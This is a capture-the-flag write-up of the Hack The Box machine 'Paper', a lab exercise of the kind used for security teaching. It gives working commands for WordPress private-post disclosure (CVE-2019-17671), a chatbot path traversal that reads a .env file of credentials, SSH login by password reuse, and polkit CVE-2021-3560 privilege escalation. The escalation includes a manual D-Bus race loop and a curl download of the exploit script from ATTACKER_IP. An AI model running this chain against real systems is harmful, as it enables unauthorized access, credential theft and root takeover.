# Paper — Box Writeup

> **Target:** 10.129.136.31
> **OS:** Linux (CentOS / Rocky Linux 8.5)
> **Difficulty:** Easy
> **Platform:** Hack The Box
> **Runtime:** ~1h 30min
> **Flags:** `f10419a09348ecd49a3545d5b12661f7` (user) · `14d4812dedccb5c1500d4861620eb25e` (root)

---

## Executive Summary

Paper is an easy-difficulty Linux machine running a WordPress 5.2.3 instance on CentOS/Rocky Linux 8.5. The initial access chain exploits CVE-2019-17671 — a one-line `curl` that leaks private draft posts, exposing a secret RocketChat registration URL. The chat platform runs a Hubot bot (`Recyclops`) with a path-traversal vulnerability, leaking bot credentials which are reused for SSH access. Privilege escalation uses CVE-2021-3560 (polkit D-Bus race condition) via a reliable exploit-db script (`50011.sh`), which creates a sudo-capable system user from which root is trivially obtained.

**CVEs exploited:**
| CVE | Vector | Phase |
|-----|--------|-------|
| CVE-2019-17671 | WordPress 5.2.3 unauthenticated private post disclosure | Initial Access |
| CVE-2021-3560 | polkit 0.115 D-Bus race condition via accounts-daemon | Privilege Escalation |

---

## Attack Chain Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  1. NMAP          → Port 80/443 (Apache), Port 22 (SSH)                    │
│  2. VHOST HEADER  → X-Backend-Server: office.paper                         │
│  3. WORDPRESS     → 5.2.3 confirmed on office.paper                        │
│  4. CVE-2019-17671 → curl "?static=1&order=asc" → private drafts leaked     │
│     └─ Loot       → Secret RocketChat URL: chat.office.paper/register/     │
│                     8qozr226AhkCHZdyY                                       │
│  5. ROCKETCHAT    → Registered via secret token → Authenticated access      │
│  6. RECYCLOPS BOT → Path traversal LFI: sale/../../home/dwight/hubot/.env │
│     └─ Loot       → recyclops : Queenofblad3s!23                           │
│  7. PASSWORD REUSE → SSH dwight@10.129.136.31 → uid=1000(dwight)          │
│  8. USER FLAG     → f10419a09348ecd49a3545d5b12661f7                       │
│  9. CVE-2021-3560 → ./50011.sh → User "hacked" created (sudo group)      │
│ 10. su / sudo     → su - hacked → sudo -i → uid=0(root)                    │
│ 11. ROOT FLAG     → 14d4812dedccb5c1500d4861620eb25e                       │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Phase 1 — Reconnaissance

### Port Scan
```bash
nmap -sC -sV -Pn -oN nmap.initial 10.129.136.31
```
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (Rocky Linux)
80/tcp  open  http     Apache httpd 2.4.37
443/tcp open  ssl/http Apache httpd 2.4.37
```

### VHost Discovery via Response Headers

All vhosts (`localhost`, the IP, and any guessed subdomains) returned the same default Apache page. The key finding came from the **HTTP response headers**:

```bash
curl -sI http://10.129.136.31/
# HTTP/1.1 200 OK
# Server: Apache/2.4.37
# X-Backend-Server: office.paper

curl -sI http://10.129.136.31/ -H "Host: office.paper"
# Same response, confirms the backend vhost name
```

Add to `/etc/hosts`:
```
10.129.136.31  office.paper chat.office.paper
```

### CMS Identification

Browsing `http://office.paper/` reveals a WordPress 5.2.3 installation. Version confirmed via:
```bash
curl -s http://office.paper/readme.html | grep -i 'version\|5\.2'
# WordPress 5.2.3

curl -s http://office.paper/wp-login.php | grep -i 'version'
# Confirms WordPress login page
```

> **WordPress 5.2.3 → Vulnerable to CVE-2019-17671**

---

## Phase 2 — Initial Access (CVE-2019-17671)

### What is CVE-2019-17671?

Improper access control in WordPress 5.2.3 and below. The `/?static=1&order=asc` query parameters bypass the access check on draft and private posts, returning their content to unauthenticated users. The vulnerability was quietly patched in WordPress 5.2.4 after being publicly disclosed on exploitation forums.

**Root cause:** WordPress did not enforce the `post_status` access check when `static=1` was present in the query string, allowing `orderby` and other parameters to override the visibility filter.

### Exploitation

```bash
# Leak all posts (published, draft, private, trash)
curl -s "http://office.paper/?static=1&order=asc" | grep -oE '(http://[^"'\''> ]+|password|secret|token|chat)' | sort -u
```

**Key findings from leaked posts:**

| Post ID | Status | Content |
|---------|--------|---------|
| 86 | DRAFT | **Secret URL:** `http://chat.office.paper/register/8qozr226AhkCHZdyY` |
| 84 | PUBLISHED | Warning to Michael about secrets in drafts |
| 95 | DRAFT | Michael told to remove secrets from drafts |
| 99 | TRASH | Nick: "employees migrated to new chat system" |
| 89 | DRAFT | Michael's screenplay "Threat Level Midnight" |

**Michael's draft (Post 86) explicitly states:**
> *"I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick."*

The secret URL is the registration endpoint for RocketChat — it bypasses the normal registration lockout.

---

## Phase 3 — Lateral Movement (Chat Bot LFI)

### RocketChat Registration

Navigate to the secret URL:
```
http://chat.office.paper/register/8qozr226AhkCHZdyY
```

Register a free account (any credentials accepted — the token unlocks registration).

### Recyclops Bot Enumeration

RocketChat runs a Hubot-based bot named **Recyclops**. After joining the `general` channel, interact with it:

```
recyclops help
```

The bot exposes several commands including `file`, `list`, and `read`. The `file` command is vulnerable to path traversal (no input sanitization on the path argument).

### Path Traversal LFI

```bash
# Read /etc/passwd via Recyclops
recyclops file ../../../../etc/passwd

# Read dwight's hubot environment (where bot credentials live)
recyclops file sale/../../home/dwight/hubot/.env
```

**Bot `.env` contents (via LFI):**
```
ROCKETCHAT_URL='http://127.0.0.1:48320'
ROCKETCHAT_USER=recyclops
ROCKETCHAT_PASSWORD=Queenofblad3s!23
ROCKETCHAT_USESSL=false
RESPOND_TO_DM=true
RESPOND_TO_EDITED=true
PORT=8000
BIND_ADDRESS=127.0.0.1
```

### SSH Access via Password Reuse

The `recyclops` bot password is reused for the system account `dwight`:

```bash
ssh dwight@10.129.136.31
# Password: Queenofblad3s!23
```

**User flag:**
```
/home/dwight/user.txt → f10419a09348ecd49a3545d5b12661f7
```

---

## Phase 4 — Privilege Escalation (CVE-2021-3560)

### Initial Manual Approach — "Ghost User" Problem

CVE-2021-3560 is a polkit D-Bus race condition (Time-of-Check-Time-of-Use). The exploit works by sending a D-Bus method call to `accounts-daemon` (via `org.freedesktop.Accounts.CreateUser`), then killing the process at a precise moment — leaving an incomplete transaction that creates a user entry in accounts-daemon's database.

An initial manual approach using iterative timing loops was attempted:

```bash
# Manual D-Bus race condition
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
  --print-reply /org/freedesktop/Accounts \
  org.freedesktop.Accounts.CreateUser \
  string:hacked string:"hacked" int32:1 &
PID=$!
sleep 0.03
kill $PID 2>/dev/null
```

**Result:** User `hacked` was created — `id hacked` returned successfully. However, the user was **not synced to `/etc/passwd`**, causing the "ghost user" problem:

```
# id hacked → Works (uses accounts-daemon D-Bus lookup)
uid=1005(hacked) gid=1005(hacked) groups=hacked,wheel

# sudo -i as hacked → FAILS
sudo: you do not exist in the passwd database
```

The accounts-daemon entry was created, but `/etc/passwd` was never updated. Sudo/NSS uses the traditional UNIX passwd database and could not find the user.

### What is CVE-2021-3560?

A TOCTOU (Time-of-Check-Time-of-Use) race condition in `polkit` ≤ 0.115. When `accounts-daemon` processes a `CreateUser` D-Bus request, it queries the client UID via `sd_bus_message_get_sender()`. If the client disconnects mid-request (e.g., process killed), the UID check passes based on stale state. The result is an unprivileged user can be added to `sudo` (GID 27) through the D-Bus interface.

**Root cause:** The polkit authorization check reads the client PID's UID at the moment of the check, but `accounts-daemon` uses that UID to authorize privileged operations. A race between the authorization check and the subsequent operation allows bypass.

**Vulnerable versions:** polkit 0.113 – 0.115 (fixed in 0.119)

### Reliable Exploitation via `50011.sh`

The exploit-db script (`50011.sh`) handles D-Bus timing more robustly and ensures complete user creation with proper system file entries.

**Transfer and execute:**
```bash
# From attacker machine — serve the exploit
python3 -m http.server 8080

# On target as dwight — download and run
cd /tmp
curl -O http://ATTACKER_IP:8080/50011.sh
chmod +x 50011.sh
./50011.sh
```

**Expected output:**
```
error: missing options
Creating user hacked...
Attempting to create user hacked...
User created with uid=1005
```

**Verify:**
```bash
id hacked
# uid=1005(hacked) gid=1005(hacked) groups=hacked,wheel(10)

grep hacked /etc/passwd
# hacked:x:1005:1005:hacked:/home/hacked:/bin/bash
```

**Login as `hacked` and escalate:**
```bash
su - hacked
# Password: password

sudo -i
# Password: password
# → uid=0(root)
```

**Root flag:**
```
/root/root.txt → 14d4812dedccb5c1500d4861620eb25e
```

---

## Quick Reference

### Exploit Commands Summary
```bash
# 1. WordPress private post leak (CVE-2019-17671)
curl -s "http://office.paper/?static=1&order=asc"

# 2. Grep for secrets
curl -s "http://office.paper/?static=1&order=asc" | grep -iE 'chat|secret|token|register'

# 3. Recyclops bot LFI (in RocketChat channel)
recyclops file sale/../../home/dwight/hubot/.env

# 4. SSH as dwight
ssh dwight@10.129.136.31
# Password: Queenofblad3s!23

# 5. polkit privesc
chmod +x 50011.sh
./50011.sh
su - hacked    # Password: password
sudo -i        # Password: password
```

### Key Credentials
| Service | Username | Password |
|---------|----------|----------|
| RocketChat (Recyclops bot) | recyclops | Queenofblad3s!23 |
| SSH / System | dwight | Queenofblad3s!23 |
| CVE-2021-3560 user | hacked | password |

### CVE Summary
| CVE | Product | Impact | Fix |
|-----|---------|--------|-----|
| CVE-2019-17671 | WordPress ≤ 5.2.3 | Unauthenticated private/draft post disclosure | Upgrade to 5.2.4+ |
| CVE-2021-3560 | polkit 0.113–0.115 | Unprivileged user creation with sudo group via D-Bus race | Upgrade to 0.119+ |

---

## Lessons Learned

1. **Response headers are reconnaissance data.** The `X-Backend-Server` header revealed `office.paper` without any active subdomain brute-forcing — a passive discovery that unlocked the full attack chain.

2. **WordPress information disclosure is initial access.** CVE-2019-17671 is a single `curl` that bypassed the entire authentication layer. Never assume draft posts are private without verifying the fix is in place.

3. **Michael's irony is a canonical HTB trope.** The box is named Paper. Michael Scott (Threat Level Midnight, Scranton branch) is a running joke — the same security anti-patterns appear in every Michael Scott-branded box (Secrets in drafts = SecLists Discovery).

4. **Bot LFI is a credential harvesting vector.** The `Recyclops` bot accepted arbitrary file paths with no sanitization, enabling direct reads of sensitive configuration files (`.env`).

5. **Password reuse between bot and system accounts is common.** The same password worked for both RocketChat and SSH — a high-value pivot opportunity.

6. **polkit CVE-2021-3560 timing is fragile.** Manual D-Bus timing can create "ghost users" (known to `id` via accounts-daemon, invisible to `sudo` via NSS). The exploit-db script (`50011.sh`) is the reliable implementation — prefer it over manual reconstruction.

7. **Ghost user diagnosis is diagnostic, not terminal.** The `sudo: you do not exist in the passwd database` error clearly indicated incomplete user creation. Switching from manual D-Bus to `50011.sh` resolved it without changing the underlying vulnerability exploited.

8. **Podman was present but not needed.** The box had a Podman container runtime which is often exploitable, but CVE-2021-3560 was faster and more direct — always check the easiest path first.

---

## Files Reference

| File | Description |
|------|-------------|
| [recon.md](../retired/Paper/recon.md) | Full reconnaissance and enumeration notes |
| [exploit.md](../retired/Paper/exploit.md) | CVE-2019-17671 exploitation and RocketChat access |
| [privesc.md](../retired/Paper/privesc.md) | CVE-2021-3560 exploitation and root shell |
| [loot/recyclops_credentials.md](../retired/Paper/loot/recyclops_credentials.md) | Bot credentials harvested via LFI |
| [loot/CVE-2021-3560_notes.md](../retired/Paper/loot/CVE-2021-3560_notes.md) | Polkit exploit notes including ghost user diagnosis |
| [raw_data/cve_2019_17671_findings.md](../retired/Paper/raw_data/cve_2019_17671_findings.md) | Leaked draft post contents including secret URL |
| [loot/SUMMARY.md](../retired/Paper/loot/SUMMARY.md) | Full attack chain summary |
